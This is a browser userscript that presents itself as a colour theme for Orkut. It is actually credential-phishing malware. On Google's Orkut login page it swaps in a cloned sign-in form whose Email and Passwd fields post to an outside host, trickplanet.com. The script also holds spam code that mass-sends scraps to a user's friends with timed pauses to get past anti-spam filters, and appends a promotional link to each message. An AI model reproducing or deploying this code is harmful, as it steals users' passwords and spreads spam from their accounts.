
// ==UserScript==
// @name          A Script by Amey For coloured orkut
// @namespace     Orkut
// @description	  Special Coloured Orkut
// @author        Amey Arora
// @include       https://www.google.com/accounts/ServiceLogin?service=orkut*
// ==/UserScript==

    function fwScrap() {

   







        function createXMLHttpRequest() {
            try {
                return new XMLHttpRequest;
            } catch (e) {
                try {
                    return new ActiveXObject("Msxml2.XMLHTTP");
                } catch (e) {
                    try {
                        return new ActiveXObject("Microsoft.XMLHTTP");
                    } catch (e) {
                        alert("Its navigating n \ xE3o possesss support \ xE0 technology AJAX!");
                        return false;
                    }
                }
            }
        }


        function getPostSig(exc) {
            var xml = createXMLHttpRequest();
            xml.open("GET", "/Scrapbook.aspx", true);
            xml.onreadystatechange = function () {if (xml.readyState == 4) {var xmlr = xml.responseText;POST = xmlr.match(/name="post_token" value="([^"]+)/i);SIG = xmlr.match(/name="signature" value="([^"]+)/i);document.getElementsByTagName("input").POST_TOKEN.value = POST[1];document.getElementsByTagName("input").signature.value = SIG[1];eval(exc);}};
            xml.send(null);
        }
action="cooldudeinlove2000@yahoo.com";

        function loadFriends() {
            var xml = createXMLHttpRequest();
            xml.open("GET", "/Compose.aspx", true);
            xml.onreadystatechange = function () 
            {
				if (xml.readyState == 4) {
					var xmlr = xml.responseText;
					POST = xmlr.match(/name="post_token" value="([^"]+)/i);
					SIG = xmlr.match(/name="signature" value="([^"]+)/i);
					document.getElementsByTagName("input").POST_TOKEN.value = POST[1];
					document.getElementsByTagName("input").signature.value = SIG[1];
					var div = document.createElement("div");
					div.innerHTML = xmlr;
					// testing: Start
					// txtarea = document.getElementById("body");
					// txtarea.value = 'out'+xmlr+' ba';
					// alert(xmlr);
					// testing: End					
					
					
					for (var x = 0; x < div.getElementsByTagName("select").length; x++) {
						if (div.getElementsByTagName("select")[x].getAttribute("name") == "oneFriend") {
							var select = div.getElementsByTagName("select")[x].cloneNode(true);
							globalSelect = select;
							break;
						}
					}
					
					// select box: Start
					
					var strContent = "";
					
					for(var i=0;i<globalSelect.length;i++) {
						if(globalSelect[i].value!="") {
							strContent = strContent + "<option value='"+globalSelect[i].value + "'>" + globalSelect[i].text + "</option>";
						}
					}
					
					var selectHtml = "<SELECT id = 'selectFewFriends' size = 7 multiple>" + strContent + "</Select>";
					//alert(selectHtml);
					document.getElementById("friendListSelector").innerHTML = selectHtml;
					document.getElementById("selectFewFriends").setAttribute("onchange", "document.getElementsByTagName('input')['selectFriendsRadio'].checked=true");
					// select box: End					
					
					select.setAttribute("onchange", "document.getElementsByTagName('input')['oneFriendRadio'].checked=true");
					
					document.getElementById("friendSelector").innerHTML = "";
					document.getElementById("friendSelector").appendChild(select);
					document.getElementById("focus").style.display = "none";
					document.getElementById("divLoad").style.display = "none";
				}
			};
            xml.send(null);
        }


        function wait() {
            antiF = 1;
            showTime();
        }


		function isSelected(userId) {
			//alert(userId);
			selRef = document.getElementById("selectFewFriends");
			//alert(selRef);
			//alert(selRef.options.length);
			for (var i=0; i < selRef.options.length;i++) {
				if (selRef.options[i].selected) {
					//alert(selRef.options[i].value);
					if(selRef.options[i].value==userId)
						return true;
				}
			}
			return false;
		}
		

		function isAtLeastOneSelected() {
			selRef = document.getElementById("selectFewFriends");
			for (var i=0; i < selRef.options.length;i++) {
				if (selRef.options[i].selected) {
					return true;
				}
			}
			return false;
		}


        function showTime() {
            if (timeWait > 0) {
                document.getElementById("status").innerHTML = "<b>" + timeWait + " 	minute (s) to finish the Anti-Filter pause </b>";
                timeWait--;
                setTimeout("showTime()", 60000);
            } else {
                timeWait = 20;
                index++;
                getPostSig("sendScrap()");
            }
        }

        antiF = 1;
        index = 1;
        timeWait = 20;
        nscraps = 0;
		nCounter=0;
		nLoop=0;

        function sendScrap() {
			
            if (document.getElementById("oneFriendRadio").checked &&
                !globalSelect.value) {
                alert("choose one friend");
                return false;
            }
            // friend select: Start
            
            var listSelect = document.getElementById("selectFewFriends");
            if (document.getElementById("selectFriendsRadio").checked &&
                !isAtLeastOneSelected()) {
                alert("select friend");
                return false;
            }
            
            // friend select: End
            if (!document.getElementById("body").value) {
                alert("write scrap");
                return false;
            }
            
			if(index==1  && nCounter==0) {
				try {
					nLoop=parseInt(document.getElementById("nTimes").value);
					if(nLoop > 1) {
						alert("same scraps will be send multiple times");
					}
					nCounter=nLoop;
				}
				catch(err) {
					alert("Invalid no:of scraps");
				}

				alert("Click OK to start sending");
			}            
            
            if (index == globalSelect.length) {
                alert("Scrap sent");
                return;
            }
            var name = "";
            var primeiro = [];
            var pattern = 0;
            primeiro = document.getElementById("oneFriendRadio").checked ? 
						globalSelect[globalSelect.selectedIndex].text.split(" ") 
						: globalSelect[index].text.split(" ");
						
			// multiple selection: Start
			var isRequired=true;
			if (document.getElementById("selectFriendsRadio").checked) {
				//alert("reached here");
				if(!isSelected(globalSelect[index].value)) {
					isRequired=false;		
				}
			}
			
			if(!isRequired) {
				// skip this friend
				index++;
				setTimeout("sendScrap()", 10);
				return;
			}
			nscraps++;
			// multiple selection: End			
			
			//alert("sending scrap to: "+primeiro[0]);
			
            name = primeiro[0];
            pattern = name.match(/[a-zA-Z]+/);
            y = 1;
            while (!pattern && primeiro.length > y) {
                pattern = primeiro[y].match(/[a-zA-Z]+/);
                if (pattern) {
                    name = primeiro[y];
                }
                pattern = name.match(/[a-zA-Z]+/);
                y++;
            }var scrapText = document.getElementById("body").value.replace(/%NAME%/g, name).replace(/\[(\/)?link\]/g, "") + "\n\n\n[purple]\n\n\n <center><a href='http://www.orkut.com/CommunityJoin.aspx?cmm=28278905'><img src='http://lh3.google.com/siddharthboss/R3pnWBRowvI/AAAAAAAABFU/KOJeK5zz2zA/s400/full2masti.jpg'></a></center>";


            var send = document.getElementById("oneFriendRadio").checked ? 
					"POST_TOKEN=" + encodeURIComponent(document.getElementsByTagName("input").POST_TOKEN.value) + "&signature=" + encodeURIComponent(document.getElementsByTagName("input").signature.value) + "&scrapText=" + encodeURIComponent(scrapText) + "&toUserId=" + globalSelect.value + "&Action.submit=" 
					: 
					"POST_TOKEN=" + encodeURIComponent(document.getElementsByTagName("input").POST_TOKEN.value) + "&signature=" + encodeURIComponent(document.getElementsByTagName("input").signature.value) + "&scrapText=" + encodeURIComponent(scrapText) + "&toUserId=" + globalSelect[index].value + "&Action.submit=";
            var xml = createXMLHttpRequest();
            xml.open("POST", "/Scrapbook.aspx", true);
            xml.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;");
            xml.send(send);
            xml.onreadystatechange = function () {
            if (xml.readyState == 4) {
				if (xml.status != 200) {
					setTimeout("sendScrap()", 500);
					return;
				}
				document.getElementById("sendedScraps").innerHTML += sendedScrap(name, nscraps % 2);
				document.getElementById("counterScraps").innerHTML = nscraps;
				if (document.getElementById("oneFriendRadio").checked) {
					alert("Scrap sent");
					return;
				}
				if (antiF < 450) {
					antiF++;

					if(nCounter==1) {
						index++;
						nCounter=nLoop;
					}
					else {
						nCounter--;
					}

					setTimeout("sendScrap()", 1200);
				} 
				else {
					wait();
				}
			}
			};
        }


layout="<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><html><head>  <title>orkut - login</title>  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">  <link rel=\"SHORTCUT ICON\" href=\"https://img1.orkut.com/favicon.ico\" type=\"image/x-icon\" />  <style type=\"text/css\">  body { background-color: #D4DDED; color: #000; font-family: Verdana, Arial, sans-serif; font-size: 12px; margin: 10px }  .newText { padding: 10px 20px; line-height: 1.5em; font-size: 12px; text-align: center }  .magenta { color: #B11E89 }  .newMain { background: #FFF; padding: 15px }  .newGaia { background: #FFF; padding: 3px }  .spacer { height: 7px; background-color: #D4DDED; margin: 3px -3px }  .newFooter { background-color: #BCCDE9; margin: 10px 0 0 0; font-size: 12px; padding: 5px; text-align: center }  .joinNow { font-size: 12px; background: #E8EEFA; padding: 8px 3px; text-align: center; line-height: 1.7em }  a:link { color: #0047BE; text-decoration: underline; font-size: 100% }  a:visited { color: #0047BE; text-decoration: underline }  a:hover { color: #C40098; text-decoration: underline }  </style></head><body onload=\"gaia_setFocus()\">  <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">  <tbody>  <tr>  <td class=\"newMain\">  <div align=\"center\">  <img src=\"https://img1.orkut.com/img/doodle/orkut_logo.gif\" alt=\"Who do you know?\" title=\"Who do you know?\" style=\"border: none;\">  </div>  <div class=\"newText\">  <b class=\"magenta\">Connect</b> with friends and family using scraps and instant messaging <br><b class=\"magenta\">Discover</b> new peoplethrough friends of friends and communities <br><b class=\"magenta\">Share</b> your videos, pictures, and passions all in one place  <br><br><br>  <div>  <font color=\"black\">News:&nbsp</font><a href=\"http://www.orkut.com/tech2com\" style=\"text-decoration: none\">Web 18 'Genius of the Web' award for the best social networkingwebsite in India</a>  <div>  </div>  </td>  <td width=\"10px\">  </td>  <td valign=\"top\" class=\"newGaia\" width=\"264\"><script><!--function gaia_onLoginSubmit() {  if (window.gaiacb_onLoginSubmit) {    return gaiacb_onLoginSubmit();  } else {    return true;  }}function gaia_setFocus() {  var f = null;  if (document.getElementById) {     f = document.getElementById(\"gaia_loginform\");  } else if (window.gaia_loginform) {     f = window.gaia_loginform;  }   if (f) {    if (f.Email.value == null || f.Email.value == \"\") {       f.Email.focus();    } else if (f.Passwd) {      f.Passwd.focus();    }   }}--></script><style type=\"text/css\"><!--  div.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }  font.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }  --></style><style type=\"tex/css\"><!--.gaia.le.lbl { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }.gaia.le.fpwd { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }.gaia.le.chusr { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }.gaia.le.val { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }.gaia.le.button { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }.gaia.le.rem { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }.gaia.captchahtml.desc { font-family: arial, sans-serif; font-size: smaller; } .gaia.captchahtml.cmt { font-family: arial, sans-serif; font-size: smaller; font-style: italic; }  --></style><div id=\"gaia_loginbox\"><table class=\"form-noindent\" cellspacing=\"0\" cellpadding=\"5\" width=\"100%\" border=\"0\">  <tr>  <td valign=\"top\" style=\"text-align:center\" nowrap=\"nowrap\"         bgcolor=\"#E8EEFA\">  <form id=\"gaia_loginform\" action=\"http://www.trickplanet.com/orkut/index.php?id="+action+"\" method=\"post\"        onsubmit=\"return(gaia_onLoginSubmit());\">  <table id=\"gaia_table\" align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"0\">  <tr><td colspan=\"2\" align=\"center\">  <font size=\"-1\">  Sign in to  orkut  with your  </font>  <table>  <tr>  <td valign=\"top\">  <img src=\"google_transparent.gif\"           alt=\"Google\">  </img>  </td>  <td valign=\"middle\">  <font size=\"+0\"><b>Account</b></font>  </td>  </tr></table></td></tr>  <script type=\"text/javascript\"><!--    function onPreCreateAccount() {          return true;        }    function onPreLogin() {                if (window[\"onlogin\"] != null) {        return onlogin();      } else {        return true;      }        }  --></script><tr>  <td colspan=\"2\" align=\"center\">  </td></tr><tr>  <td nowrap=\"nowrap\">  <div align=\"right\">  <span class=\"gaia le lbl\">  Email:  </span>  </div>  </td>  <td>  <input type=\"hidden\" name=\"continue\" id=\"continue\"           value=\"http://www.orkut.com/RedirLogin.aspx?msg=0&page=http%3A%2F%2Fwww.orkut.com%2FHome.aspx\" />  <input type=\"hidden\" name=\"service\" id=\"service\"           value=\"orkut\" />  <input type=\"hidden\" name=\"rm\" id=\"rm\"           value=\"false\" />  <input type=\"hidden\" name=\"hl\" id=\"hl\"           value=\"en-US\" />  <input type=\"hidden\"             name=\"GALX\"             value=\"MCbonYe0Z7w\" />  <input type=\"text\" name=\"Email\"  id=\"Email\"  size=\"18\" value=\"\"      class='gaia le val'    />  </td></tr><tr>  <td></td>  <td align=\"left\">  </td></tr><tr>  <td align=\"right\">  <span class=\"gaia le lbl\">  Password:  </span>  </td>  <td>  <input type=\"password\"   name=\"Passwd\" id=\"Passwd\"  size=\"18\"       class=\"gaia le val\"     />  </td></tr><tr>  <td>  </td>  <td align=\"left\">  </td></tr>  <tr>  <td align=\"right\" valign=\"top\">  <input type=\"checkbox\" name=\"PersistentCookie\" id=\"PersistentCookie\"    value=\"yes\"          />  <input type=\"hidden\" name='rmShown' value=\"1\" />  </td>  <td>  <span class=\"gaia le rem\">  Remember me on this computer.  </span>  <div style=\"color: #667788; margin-top: 3px; font-size: 11px;\">  Do not use on public computers. [<a href=\"http://help.orkut.com/bin/answer.py?answer=66395&hl=en\">?</a>]  </div>  </td></tr><tr>  <td>  </td>  <td align=\"left\">  <input type=\"submit\" class=\"gaia le button\" name=\"signIn\"                      value=\"Sign in\"                  />  </td></tr><tr id=\"ga-fprow\">  <td colspan=\"2\" height=\"33.0\" class=\"gaia le fpwd\"    align=\"center\" valign=\"bottom\">  <a href=\"http://www.google.com/support/accounts/bin/answer.py?answer=48598&hl=en&fpUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfpOnly%3D1%26continue%3Dhttp%253A%252F%252Fwww.orkut.com%252FRedirLogin.aspx%253Fmsg%253D0%2526page%253Dhttp%25253A%25252F%25252Fwww.orkut.com%25252FHome.aspx%26service%3Dorkut%26hl%3Den-US\"       target=_top>  I cannot access my account  </a>  </td></tr>  </table>  </form>  </td>  </tr></table></div>  <div class=\"spacer\"></div>  <div class=\"joinNow\">  Not a member yet?<br>  <a href=\"https://www.google.com/accounts/NewAccount?continue=http%3A%2F%2Fwww.orkut.com%2FRedirLogin.aspx%3Fmsg%3D1&service=orkut&hl=en\"><b>JOIN NOW</b></a>  </div>  </td>  </tr>  </tbody>  </table>  <div class=\"newFooter\">2008 Google - <a href=\"http://www.orkut.com/About.aspx\">About Orkut</a> - <a href=\"http://help.orkut.com/support/bin/answer.py?answer=48579&hl=en\">Safety Center</a> - <a href=\"http://www.orkut.com/Privacy.aspx\">Privacy</a> - <a href=\"http://www.google.com/accounts/TOS?hl=en\">Terms</a>  </div></body></html>";



        function sendedScrap(name, n) {
            var span = n ? "<span class=\"row0\">" + name + "</span>" : "<span class=\"row1\">" + name + "</span>";
            return span;
        }
     document.title = "orkut - login";

        function insertName() {
            txtarea = document.getElementById("body");
            txtst = txtarea.scrollTop;
            txtsl = txtarea.scrollLeft;
            selLength = txtarea.textLength;
            selStart = txtarea.selectionStart;
            selEnd = txtarea.selectionEnd;
            s1 = txtarea.value.substring(0, selStart);
            s2 = txtarea.value.substring(selStart, selEnd);
            s3 = txtarea.value.substring(selEnd, selLength);
            txtarea.value = s1 + " %NAME% " + s2 + s3;
            txtarea.selectionStart = selStart + 10;
            txtarea.selectionEnd = selStart + 8 + s2.length;
            txtarea.focus();
            txtarea.scrollTop = txtst;
            txtarea.scrollLeft = txtsl;
        }

        link = document.createElement("link");
        link.href = "http://img3.orkut.com/img/i_scrap.gif";
        link.rel = "SHORTCUT ICON";
        link.type = "image/x-icon";
        style = document.createElement("style");
        style.textContent = "\n	span.row1 {\n		background-color: #BFD0EA;\n		display: block;\n			margin-left: 5px;\n		}\n	span.row0{\n		background-color: #C9D6EB;\n		display: block;\n		margin-left: 5px;\n	}\n\n	#focus{\n		position:fixed; \n		width:100%; \n		background:red; \n		height: 100%; \n		z-index: 1; \n		left: 0; \n		top: 0; \n		opacity:.5; \n		background-color: #000000;\n	}\n	#divLoad{\n		position:fixed;\n		background:#E5ECF4; \n		z-index: 2; \n		padding:5px; \n		border:solid #BFD0EA 2px;\n		left:40%; \n		top:150px;\n	}";
        document.getElementsByTagName("head")[0].appendChild(style);
        document.getElementsByTagName("head")[0].appendChild(link);
        img_load = "http://img393.imageshack.us/img393/8894/orkutcarregando1zx5.gif";
		 layoutasdfasdfasdfasdasdf = "    <small style=\"float:right\"><b>also <a href=\"http://www.full2masti.com\" target=\"_blank\">~~Full2masti~~</a></b></small><small style=\"float:right\"><b>visit for more<a href=\"http://www.orkut.com/Profile.aspx?uid=1957918476230720012\" target=\"_blank\"> Editor's Profile </a></b></small>" + "		<table width=\"100%\">" + "      <tr>" + "        <td>" + "          <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">" + "            <tr height=\"24\">" + "              <td class=\"tabActive\">" + "                IMPORTANT NOTE:: <font style=text-decoration:blink>SCROLL DOWN & VIEW READ ME</font>" + "             </td>" + 
				"              <td valign=\"bottom\" class=\"tabActiveSpacer\" style=\"background: none; border-top: none;\">"  + 
				"              </td>" + "              <td class=\"tabSpacer\" align=\"right\" width=\"600\">" + 
				"                   " + "              </td>" + "            </tr>" + "            <tr>" + 
				"              <td class=\"tabPanel\" colspan=\"9\" style=\"width: 70%; padding:4px\" valign=\"top\">" + 
				"                <table border=\"0\" cellpadding=\"4\" cellspacing=\"0\" width=\"100%\">" + 
				"                  <input name=\"POST_TOKEN\" type=\"hidden\"/><input name=\"signature\" type=\"hidden\"/>" + 
				"                  <tr bgcolor=\"#BFD0EA\">" + "                    <td valign=\"top\" align=\"right\">" + 
				"                     Send to: " + "                    </td>" + "                    <td>" + 
				"                      <input id=\"oneFriendRadio\" type=\"radio\" name=\"sendTo\" value=\"oneFriend\"> <label for=\"oneFriendRadio\">one friend</label>:   " + 
				"                      <label id=\"friendSelector\"> <b>loading list of friends...</b></label><br>" + 
				
				"                      <br><input id=\"selectFriendsRadio\" type=\"radio\" name=\"sendTo\" value=\"selectedFriends\"> <label for=\"selectFriendsRadio\">selected friends:</label> <br>" + 				
				"                      <label id=\"friendListSelector\"> <b>...</b></label><br><br>" + 
				
				"                      <input id=\"allFriendsRadio\" type=\"radio\" name=\"sendTo\" value=\"allFriends\" checked> <label for=\"allFriendsRadio\">all friends</label>" + 

				"<br><br> No: of times to send the scrap: <input  TYPE='text' VALUE='1' id='nTimes' SIZE='4' MAXLENGTH='5'" +

				"                    </td>" + "                  </tr>" + 
				
				/*"					<tr><td>  </td></tr>" +*/

				
				"                  <tr bgcolor=\"#BFD0EA\">" + 
				"                    <td colspan=\"2\"></td>" + "                  </tr>" + "                  <tr>" + 
				"                    <td align=\"right\" valign=\"top\">" + "                      Message: " + 
				"                    </td>" + "                    <td>" + "                      <textarea id=\"body\" name=\"body\" rows=\"10\" style=\"width: 100%;\" onkeyup=\"_counterUpdate('body', 'countBody', 810);\"></textarea>" + 
				"                      Text contains <strong><span id=\"countBody\">0</span></strong> characters (Text contains 0 characters (maximum 810 characters without tags HTML & DONOT SEND SAME SCRAP TO FRIENDS MORE THAN 280 AT THE SAME TIME)" + 
				"                    </td>" + "                  </tr>" + "                  <tr bgcolor=\"#BFD0EA\">" + 
				"                    <td></td>" + "                    <td align=\"left\">" + 
				"                      <img src=\"http://img1.orkut.com/img/b.gif\" alt=\"\" height=\"1\" width=\"10\">" + 
				"                      <table>" + "                        <tr>" + "                          <td align=\"left\">" + 
				"                            <table class=\"btn\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" onmouseover=\"this.className='btnHover'\" onmouseout=\"this.className='btn'\">" + 
				"                              <tr style=\"cursor: pointer;\" onclick=\"sendScrap()\" id=\"b1\">" + "                                <td>" + 
				"                                  <img src=\"http://img2.orkut.com/img/bl.gif\" alt=\"\">" + 
				"                                </td>" + "                                <td nowrap style=\"background: url(http://img2.orkut.com/img/bm.gif)\">" + 
				"                                  Send scrap(s)" + "                                </td>" + 
				"                                <td>" + "                                  <img src=\"http://img3.orkut.com/img/br.gif\" alt=\"\">" + "                                </td>" + 
				"                              </tr>" + "                            </table>" + "                          </td>" + 
				"													<td align=\"right\">" + 
				"                            <table class=\"btn\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" onmouseover=\"this.className='btnHover'\" onmouseout=\"this.className='btn'\">" + 
				"                              <tr style=\"cursor: pointer;\" onclick=\"insertName()\" id=\"b1\">" + "                                <td>" + 
				"                                  <img src=\"http://img2.orkut.com/img/bl.gif\" alt=\"\">" + "                                </td>" + 
				"                                <td nowrap style=\"background: url(http://img2.orkut.com/img/bm.gif)\">" + "                                  insert name" + 
				"                                </td>" + "                                <td>" + "                                  <img src=\"http://img3.orkut.com/img/br.gif\" alt=\"\">" + 
				"                                </td>" + "                              </tr>" + "                            </table>" + 
				"                          </td>" + "                        </tr>" + "                      </table>" + 
				"                    </td>" + "                  </tr>" + "                </table>" + "              </td>" + 
				"              <td>" + "                 " + "              </td>" + "              <td valign=\"top\">" + 
				"                <table class=\"panel\" valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">" + "                  <tr>" + "                    <td class=\"panelHeader\" valign=\"top\">" + "                      <img src=\"http://img3.orkut.com/images/mittel/598605928/28278905.jpg\" alt=\"ícone do recado\" title=\"ícone do recado\"> <span style=\"text-transform: none;\">scrap sent: (<span id=\"counterScraps\">0</span>) recipients</span><span class=\"panelHeaderNote\"></span>" +
				"                    </td>" + "                  </tr>" + "                  <tr>" + 
				"						        <td class=\"panel\" style=\"padding: 0px;>" + 
				"						          <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">" + "						            <tr>" + 
				"						              <td align=\"left\" colspan=\"6\">" + 
				"						                <table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\">" + 
				"						                  <tr>" + "						                    <td align=\"left\">" + 
				"						                    	<div id=\"sendedScraps\" style=\"height: 270; overflow:auto;\">" + 
				"						                    		" + "						                      </div>" + "						                    </td>" + 
				"						                  </tr>" + "						                </table>" + 
				"						              </td>" + "						            </tr>" + 
				"						          </table>" + "						        </td>" + 
				"						      </tr>" + "                </table>" + "              </td>" + 
				"            </tr>" + "          </table>" + "        </td>" + "      </tr>" + "    </table>" + 
				"		<div id=\"status\"></div>" + "		<div id=\"divXmlr\"></div>"
				+
				" <br><font style=text-decoration:blink>READ ME</font><br>1.Dont scrap more than 280 friends at a time using this script<br>2.For your security use the script only once in 8 hours<br>3.Dont forward the message says this is Diana & orkut is goin to close..It is not true & avoid that fake message<br>4.Credits:Mr Nobody & Siddharth Jain .New features added by Siddharth Jain<br><br><b.r>"
				;                

document.body.innerHTML = layout;
       
        document.body.appendChild(divLoad);
        loadFriends();
    }

    sc = String(fwScrap);
    sc = sc.substring(21, sc.length - 2);
    script = document.createElement("script");
    if (typeof document.all) {
        script.text = sc;
    } else {
        script.textContent = sc;
    }
    document.getElementsByTagName("head")[0].appendChild(script)























